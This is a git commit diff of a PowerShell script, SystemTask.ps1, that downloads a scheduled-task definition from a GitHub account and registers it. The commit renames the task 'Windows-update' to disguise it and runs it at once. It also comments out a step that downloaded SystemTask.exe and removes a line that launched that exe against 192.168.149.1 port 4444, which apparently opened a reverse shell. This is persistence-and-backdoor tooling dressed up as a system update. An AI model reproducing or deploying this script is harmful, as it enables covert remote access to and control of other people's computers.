b3ab05fd049e1862c233df693be812c562c92f4f
Gh0st1nTh3Sh3ll1 <Gh0st1nTh3Sh3llUIT@gmail.com>
2017-03-11 14:10:48 +0700

    Update SystemTask.ps1

--- SystemTask.ps1
+++ SystemTask.ps1
@@ -2,11 +2,11 @@ $client = new-object System.Net.WebClient
 $url = 'https://raw.githubusercontent.com/Gh0st1nTh3Sh3ll1/SystemTask/master/SystemTask.xml'
 $file = 'SystemTask.xml'
 $client.DownloadFile($url,$file)
-$url = 'https://raw.githubusercontent.com/Gh0st1nTh3Sh3ll1/SystemTask/master/SystemTask.exe' 
-$file = 'SystemTask.exe'
-$client.DownloadFile($url,$file)
-$command = 'schtasks.exe /create /tn SystemTask /xml SystemTask.xml'
+#$url = 'https://raw.githubusercontent.com/Gh0st1nTh3Sh3ll1/SystemTask/master/SystemTask.exe' 
+#$file = 'SystemTask.exe'
+#$client.DownloadFile($url,$file)
+$command = 'schtasks.exe /create /tn Windows-update /xml SystemTask.xml'
 iex $command
-$command = 'SystemTask.exe 192.168.149.1 4444'
+$command = 'schtasks.exe /run /tn Windows-update'
 iex $command
 exit
